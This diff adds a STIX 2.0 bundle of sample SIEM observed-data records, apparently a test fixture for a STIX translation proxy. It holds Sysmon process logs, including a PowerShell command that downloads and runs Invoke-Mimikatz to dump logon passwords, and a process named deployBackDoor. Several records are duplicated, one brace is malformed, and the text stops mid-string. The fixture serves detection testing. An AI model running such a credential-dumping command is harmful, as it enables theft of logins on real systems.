@@ -1,0 +1,673 @@
+{
+	"type": "bundle",
+	"id": "281fe97a-35d8-4b84-be2e-253047cc6274",
+	"spec_version": "2.0",
+	"objects": [
+		{
+			"type": "identity",
+			"id": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
+			"name": "shifter_proxy",
+			"identity_class": "events"
+		},
+		{
+			{
+	"id": "observed-data--6851748e-0901-462b-a107-d3f3ff6c6a34",
+	"type": "observed-data",
+	"created": "2020-10-16T17:19:32.132Z",
+	"objects": {
+		"0": {
+			"type": "ipv4-addr",
+			"value": "192.168.0.2",
+			"resolves_to_refs": "2"
+		},
+		"1": {
+			"type": "network-traffic",
+			"dst_ref": "3",
+			"src_ref": "0",
+			"dst_port": 0,
+			"src_port": 0,
+			"protocols": [
+				"reserved"
+			]
+		},
+		"2": {
+			"type": "mac-addr",
+			"value": "00:00:00:00:00:00"
+		},
+		"3": {
+			"type": "ipv4-addr",
+			"value": "192.168.0.2",
+			"resolves_to_refs": "4"
+		},
+		"4": {
+			"type": "mac-addr",
+			"value": "00:00:00:00:00:00"
+		},
+		"5": {
+			"type": "artifact",
+			"payload_bin": "PDE4Mj5PY3QgMTAgMTU6NDc6MTkgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQxODgJVGltZUdlbmVyYXRlZD0xNTcwMTEwNjcwCVRpbWVX\ncml0dGVuPTE1NzAxMTA2NzAJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTE6MTAuNTcwIFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkNDRS01RDk1LTAwMDAtMDAxMDc4\nRUIwQjAwfSBQcm9jZXNzSWQ6IDIyNTIgSW1hZ2U6IEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93\nc1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSBGaWxlVmVyc2lvbjogMTAuMC4xNDQwOS4x\nMDA1IChyczFfc3J2b29iLjE2MTIwOC0xMTU1KSBEZXNjcmlwdGlvbjogV2luZG93cyBQb3dlclNo\nZWxsIFByb2R1Y3Q6IE1pY3Jvc29mdMKuIFdpbmRvd3PCriBPcGVyYXRpbmcgU3lzdGVtIENvbXBh\nbnk6IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbiBDb21tYW5kTGluZTogcG93ZXJzaGVsbCAiSUVYIChO\nZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRo\ndWJ1c2VyY29udGVudC5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L21hc3Rlci9FeGZp\nbHRyYXRpb24vSW52b2tlLU1pbWlrYXR6LnBzMScpO0ludm9rZS1NaW1pa2F0eiAtQ29tbWFuZCAn\ncHJpdmlsZWdlOjpkZWJ1ZyBzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMgZXhpdCciIEN1cnJlbnRE\naXJlY3Rvcnk6IEM6XFdpbmRvd3Ncc3lzdGVtMzJcIFVzZXI6IFdpblNlcnZlclxhZG1pbiBMb2dv\nbkd1aWQ6IHsxQzJEM0Y1NC1GNzM1LTVEOTUtMDAwMC0wMDIwOTQ2RDA0MDB9IExvZ29uSWQ6IDB4\nNDZkOTQgVGVybWluYWxTZXNzaW9uSWQ6IDEgSW50ZWdyaXR5TGV2ZWw6IEhpZ2ggSGFzaGVzOiBT\nSEExPUYzOTNEN0I1MzFDRDQ0Q0U0MTg2NDdGRTk1NzE1QURDM0UzQzYxRDIsTUQ1PUVCMzJDMDcw\nRTY1ODkzN0FBOUZBOUYzQUU2MjlCMkI4LFNIQTI1Nj03MEJBNTdGQjBCRjJGMzRCODY0MjZEMjE1\nNTlGNUY2RDA1QzEyNjgxOTM5MDRERThFOTU5RDdCMDZDRTk2NENFLElNUEhBU0g9QTREMzJGMUFF\nRjUyNUI4QURBNkEyNkYyODU5NkFDMkUgUGFyZW50UHJvY2Vzc0d1aWQ6IHsxQzJEM0Y1NC1GQTcy\nLTVEOTUtMDAwMC0wMDEwRTJFNjA5MDB9IFBhcmVudFByb2Nlc3NJZDogMTY2OCBQYXJlbnRJbWFn\nZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIFBhcmVudENvbW1hbmRMaW5lOiAiQzpcV2lu\nZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAK"
+		},
+		"6": {
+			"name": "powershell.exe",
+			"type": "file",
+			"hashes": {
+				"MD5": "EB32C070E658937AA9FA9F3AE629B2B8",
+				"imp": "A4D32F1AEF525B8ADA6A26F28596AC2E",
+				"SHA-1": "F393D7B531CD44CE418647FE95715ADC3E3C61D2",
+				"SHA-256": "70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE"
+			},
+			"parent_directory_ref": "8"
+		},
+		"7": {
+			"pid": 2252,
+			"name": "powershell.exe",
+			"type": "process",
+			"binary_ref": "6",
+			"command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\""
+		},
+		"8": {
+			"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+			"type": "directory"
+		}
+	},
+	"modified": "2020-10-16T17:19:32.132Z",
+	"last_observed": "2020-10-16T14:47:19.690Z",
+	"created_by_ref": "identity--bb6c2fac-61c4-4e59-bb38-a82c7f8d1fb1",
+	"first_observed": "2020-10-16T14:47:19.690Z",
+	"number_observed": 1,
+	"x_com_ibm_ariel": {
+		"qid": 5001828,
+		"qid_name": "Process Create",
+		"magnitude": 6,
+		"devicetype": 12,
+		"category_id": 19012,
+		"identity_ip": "0.0.0.0",
+		"utf8_payload": "<182>Oct 10 15:47:19 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-10-16 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft® Windows® Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: BIGGUY LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+		"category_name": "Create Activity Succeeded    ",
+		"log_source_id": 112,
+		"log_source_name": "WinServer"
+	}
+},
+		{
+	"id": "observed-data--439c662d-5ddd-453f-afe4-1d00faf87531",
+	"type": "observed-data",
+	"created": "2020-10-16T17:19:31.981Z",
+	"objects": {
+		"0": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "2"
+		},
+		"1": {
+			"type": "network-traffic",
+			"dst_ref": "3",
+			"src_ref": "0",
+			"dst_port": 0,
+			"src_port": 0,
+			"protocols": [
+				"reserved"
+			]
+		},
+		"2": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"3": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "4"
+		},
+		"4": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"5": {
+			"type": "user-account",
+			"user_id": "Luis"
+		},
+		"6": {
+			"type": "artifact",
+			"payload_bin": "PDE4Mj5PY3QgMTQgMTk6NTc6NTkgMTkyLjE2OC4wLjkwIDwxMz5PY3QgMDMgMTQ6NTM6MzUgV2lu\nU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdlbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5k\nb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJzaW9uPTcuMi44LjE0NQlTb3VyY2U9TWlj\ncm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdpblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1\ndGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49TlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlF\ndmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0ZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQy\nMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVXcml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9\nSW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAwMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNr\nLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5mbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRl\nOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMgMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlk\nOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEwMkUwQzAwfSBQcm9jZXNzSWQ6IDc1NyBJ\nbWFnZTogQzpcUHJvZ3JhbSBGaWxlc1xBdGxhc3NpYW5cQ29uZmx1ZW5jZVxjNjQuZXhlIENvbW1h\nbmRMaW5lOiBjNjQuZXhlIGY2NC5kYXRhICI5ODM5RDdGMUEwIC1tIiBDdXJyZW50RGlyZWN0b3J5\nOiBDOlxXaW5kb3dzXCBVc2VyOiBXaW5TZXJ2ZXJcYWRtaW4gTG9nb25HdWlkOiB7MUMyRDNGNTQt\nRjczNS01RDk1LTAwMDAtMDAyMDk0NkQwNDAwfSBMb2dvbklkOiAweDQ2ZDk0IFRlcm1pbmFsU2Vz\nc2lvbklkOiAxIEludGVncml0eUxldmVsOiBIaWdoIEhhc2hlczogU0hBMT01YmY2Yzk4YTUyZTgw\nODI0ZDFhMjM0YmQ1ZTY3M2VkYjc1YzdkZGE5LE1ENT04NDZjZGI5MjE4NDFhYzY3MWM4NjM1MGQ0\nOTRhYmY5YyxTSEEyNTY9ZGM1MmJkZjVlM2Y3MWZiOWFiM2IxNzMwZDQ0NTI4N2QxNmQzYTNjOA=="
+		},
+		"7": {
+			"name": "deployBackDoor.xls",
+			"type": "file",
+			"hashes": {
+				"MD5": "b91ce2fa41029f6955bff20079468448",
+				"SHA-1": "76640508b1e7759e548771a5359eaed353bf1eec",
+				"SHA-256": "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77"
+			},
+			"parent_directory_ref": "9"
+		},
+		"8": {
+			"pid": 757,
+			"name": "c64.exe",
+			"type": "process",
+			"binary_ref": "7",
+			"command_line": "deployBackDoor.xls f64.data \"9839D7F1A0 -m\""
+		},
+		"9": {
+			"path": "C:\\Program Files\\Atlassian\\Confluence\\deployBackDoor.xls",
+			"type": "directory"
+		}
+	},
+	"modified": "2020-10-16T17:19:31.981Z",
+	"last_observed": "2020-10-16T20:58:00.151Z",
+	"created_by_ref": "identity--bb6c2fac-61c4-4e59-bb38-a82c7f8d1fb1",
+	"first_observed": "2020-10-16T20:58:00.151Z",
+	"number_observed": 1,
+	"x_com_ibm_ariel": {
+		"qid": 5001828,
+		"qid_name": "Process Create backdoor",
+		"magnitude": 2,
+		"devicetype": 12,
+		"category_id": 19012,
+		"identity_ip": "0.0.0.0",
+		"utf8_payload": "<182>Jan 03 19:57:59 10.10.9.56 <13>Jan 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-10-16 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: BIGGUY LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+		"category_name": "Create Activity Succeeded    ",
+		"log_source_id": 1912,
+		"log_source_name": "Sysmon @ 10.10.9.56"
+	}
+},
+		{
+	"id": "observed-data--439c662d-5ddd-453f-afe4-1d00faf87531",
+	"type": "observed-data",
+	"created": "2020-10-16T17:19:31.981Z",
+	"objects": {
+		"0": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "2"
+		},
+		"1": {
+			"type": "network-traffic",
+			"dst_ref": "3",
+			"src_ref": "0",
+			"dst_port": 0,
+			"src_port": 0,
+			"protocols": [
+				"reserved"
+			]
+		},
+		"2": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"3": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "4"
+		},
+		"4": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"5": {
+			"type": "user-account",
+			"user_id": "Luis"
+		},
+		"6": {
+			"type": "artifact",
+			"payload_bin": "PDE4Mj5PY3QgMTQgMTk6NTc6NTkgMTkyLjE2OC4wLjkwIDwxMz5PY3QgMDMgMTQ6NTM6MzUgV2lu\nU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdlbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5k\nb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJzaW9uPTcuMi44LjE0NQlTb3VyY2U9TWlj\ncm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdpblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1\ndGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49TlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlF\ndmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0ZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQy\nMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVXcml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9\nSW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAwMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNr\nLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5mbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRl\nOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMgMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlk\nOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEwMkUwQzAwfSBQcm9jZXNzSWQ6IDc1NyBJ\nbWFnZTogQzpcUHJvZ3JhbSBGaWxlc1xBdGxhc3NpYW5cQ29uZmx1ZW5jZVxjNjQuZXhlIENvbW1h\nbmRMaW5lOiBjNjQuZXhlIGY2NC5kYXRhICI5ODM5RDdGMUEwIC1tIiBDdXJyZW50RGlyZWN0b3J5\nOiBDOlxXaW5kb3dzXCBVc2VyOiBXaW5TZXJ2ZXJcYWRtaW4gTG9nb25HdWlkOiB7MUMyRDNGNTQt\nRjczNS01RDk1LTAwMDAtMDAyMDk0NkQwNDAwfSBMb2dvbklkOiAweDQ2ZDk0IFRlcm1pbmFsU2Vz\nc2lvbklkOiAxIEludGVncml0eUxldmVsOiBIaWdoIEhhc2hlczogU0hBMT01YmY2Yzk4YTUyZTgw\nODI0ZDFhMjM0YmQ1ZTY3M2VkYjc1YzdkZGE5LE1ENT04NDZjZGI5MjE4NDFhYzY3MWM4NjM1MGQ0\nOTRhYmY5YyxTSEEyNTY9ZGM1MmJkZjVlM2Y3MWZiOWFiM2IxNzMwZDQ0NTI4N2QxNmQzYTNjOA=="
+		},
+		"7": {
+			"name": "deployBackDoor.xls",
+			"type": "file",
+			"hashes": {
+				"MD5": "b91ce2fa41029f6955bff20079468448",
+				"SHA-1": "76640508b1e7759e548771a5359eaed353bf1eec",
+				"SHA-256": "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77"
+			},
+			"parent_directory_ref": "9"
+		},
+		"8": {
+			"pid": 757,
+			"name": "c64.exe",
+			"type": "process",
+			"binary_ref": "7",
+			"command_line": "deployBackDoor.xls f64.data \"9839D7F1A0 -m\""
+		},
+		"9": {
+			"path": "C:\\Program Files\\Atlassian\\Confluence\\deployBackDoor.xls",
+			"type": "directory"
+		}
+	},
+	"modified": "2020-10-16T17:19:31.981Z",
+	"last_observed": "2020-10-16T20:58:00.151Z",
+	"created_by_ref": "identity--bb6c2fac-61c4-4e59-bb38-a82c7f8d1fb1",
+	"first_observed": "2020-10-16T20:58:00.151Z",
+	"number_observed": 1,
+	"x_com_ibm_ariel": {
+		"qid": 5001828,
+		"qid_name": "Process Create backdoor",
+		"magnitude": 2,
+		"devicetype": 12,
+		"category_id": 19012,
+		"identity_ip": "0.0.0.0",
+		"utf8_payload": "<182>Jan 03 19:57:59 10.10.9.56 <13>Jan 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-10-16 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: BIGGUY LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+		"category_name": "Create Activity Succeeded    ",
+		"log_source_id": 1912,
+		"log_source_name": "Sysmon @ 10.10.9.56"
+	}
+},
+		{
+	"id": "observed-data--439c662d-5ddd-453f-afe4-1d00faf87531",
+	"type": "observed-data",
+	"created": "2020-10-16T17:19:31.981Z",
+	"objects": {
+		"0": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "2"
+		},
+		"1": {
+			"type": "network-traffic",
+			"dst_ref": "3",
+			"src_ref": "0",
+			"dst_port": 0,
+			"src_port": 0,
+			"protocols": [
+				"reserved"
+			]
+		},
+		"2": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"3": {
+			"type": "ipv4-addr",
+			"value": "10.10.9.56",
+			"resolves_to_refs": "4"
+		},
+		"4": {
+			"type": "mac-addr",
+			"value": "c0:00:00:00:27:43"
+		},
+		"5": {
+			"type": "user-account",
+			"user_id": "Luis"
+		},
+		"6": {
+			"type": "artifact",
+			"payload_bin": "PDE4Mj5PY3QgMTQgMTk6NTc6NTkgMTkyLjE2OC4wLjkwIDwxMz5PY3QgMDMgMTQ6NTM6MzUgV2lu\nU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdlbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5k\nb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJzaW9uPTcuMi44LjE0NQlTb3VyY2U9TWlj\ncm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdpblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1\ndGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49TlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlF\ndmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0ZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQy\nMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVXcml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9\nSW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAwMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNr\nLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5mbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRl\nOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMgMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlk\nOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEwMkUwQzAwfSBQcm9jZXNzSWQ6IDc1NyBJ\nbWFnZTogQzpcUHJvZ3JhbSBGaWxlc1xBdGxhc3NpYW5cQ29uZmx1ZW5jZVxjNjQuZXhlIENvbW1h\nbmRMaW5lOiBjNjQuZXhlIGY2NC5kYXRhICI5ODM5RDdGMUEwIC1tIiBDdXJyZW50RGlyZWN0b3J5\nOiBDOlxXaW5kb3dzXCBVc2VyOiBXaW5TZXJ2ZXJcYWRtaW4gTG9nb25HdWlkOiB7MUMyRDNGNTQt\nRjczNS01RDk1LTAwMDAtMDAyMDk0NkQwNDAwfSBMb2dvbklkOiAweDQ2ZDk0IFRlcm1pbmFsU2Vz\nc2lvbklkOiAxIEludGVncml0eUxldmVsOiBIaWdoIEhhc2hlczogU0hBMT01YmY2Yzk4YTUyZTgw\nODI0ZDFhMjM0YmQ1ZTY3M2VkYjc1YzdkZGE5LE1ENT04NDZjZGI5MjE4NDFhYzY3MWM4NjM1MGQ0\nOTRhYmY5YyxTSEEyNTY9ZGM1MmJkZjVlM2Y3MWZiOWFiM2IxNzMwZDQ0NTI4N2QxNmQzYTNjOA=="
+		},
+		"7": {
+			"name": "deployBackDoor.xls",
+			"type": "file",
+			"hashes": {
+				"MD5": "b91ce2fa41029f6955bff20079468448",
+				"SHA-1": "76640508b1e7759e548771a5359eaed353bf1eec",
+				"SHA-256": "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77"
+			},
+			"parent_directory_ref": "9"
+		},
+		"8": {
+			"pid": 757,
+			"name": "c64.exe",
+			"type": "process",
+			"binary_ref": "7",
+			"command_line": "deployBackDoor.xls f64.data \"9839D7F1A0 -m\""
+		},
+		"9": {
+			"path": "C:\\Program Files\\Atlassian\\Confluence\\deployBackDoor.xls",
+			"type": "directory"
+		}
+	},
+	"modified": "2020-10-16T17:19:31.981Z",
+	"last_observed": "2020-10-16T20:58:00.151Z",
+	"created_by_ref": "identity--bb6c2fac-61c4-4e59-bb38-a82c7f8d1fb1",
+	"first_observed": "2020-10-16T20:58:00.151Z",
+	"number_observed": 1,
+	"x_com_ibm_ariel": {
+		"qid": 5001828,
+		"qid_name": "Process Create backdoor",
+		"magnitude": 2,
+		"devicetype": 12,
+		"category_id": 19012,
+		"identity_ip": "0.0.0.0",
+		"utf8_payload": "<182>Jan 03 19:57:59 10.10.9.56 <13>Jan 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-10-16 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: BIGGUY LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+		"category_name": "Create Activity Succeeded    ",
+		"log_source_id": 1912,
+		"log_source_name": "Sysmon @ 10.10.9.56"
+	}
+},
+{
+	"id": "observed-data--6851748e-0901-462b-a107-d3f3ff6c6a34",
+	"type": "observed-data",
+	"created": "2020-10-16T17:19:32.132Z",
+	"objects": {
+		"0": {
+			"type": "ipv4-addr",
+			"value": "192.168.0.2",
+			"resolves_to_refs": "2"
+		},
+		"1": {
+			"type": "network-traffic",
+			"dst_ref": "3",
+			"src_ref": "0",
+			"dst_port": 0,
+			"src_port": 0,
+			"protocols": [
+				"reserved"
+			]
+		},
+		"2": {
+			"type": "mac-addr",
+			"value": "00:00:00:00:00:00"
+		},
+		"3": {
+			"type": "ipv4-addr",
+			"value": "192.168.0.2",
+			"resolves_to_refs": "4"
+		},
+		"4": {
+			"type": "mac-addr",
+			"value": "00:00:00:00:00:00"
+		},
+		"5": {
+			"type": "artifact",
+			"payload_bin": "PDE4Mj5PY3QgMTAgMTU6NDc6MTkgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQxODgJVGltZUdlbmVyYXRlZD0xNTcwMTEwNjcwCVRpbWVX\ncml0dGVuPTE1NzAxMTA2NzAJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMD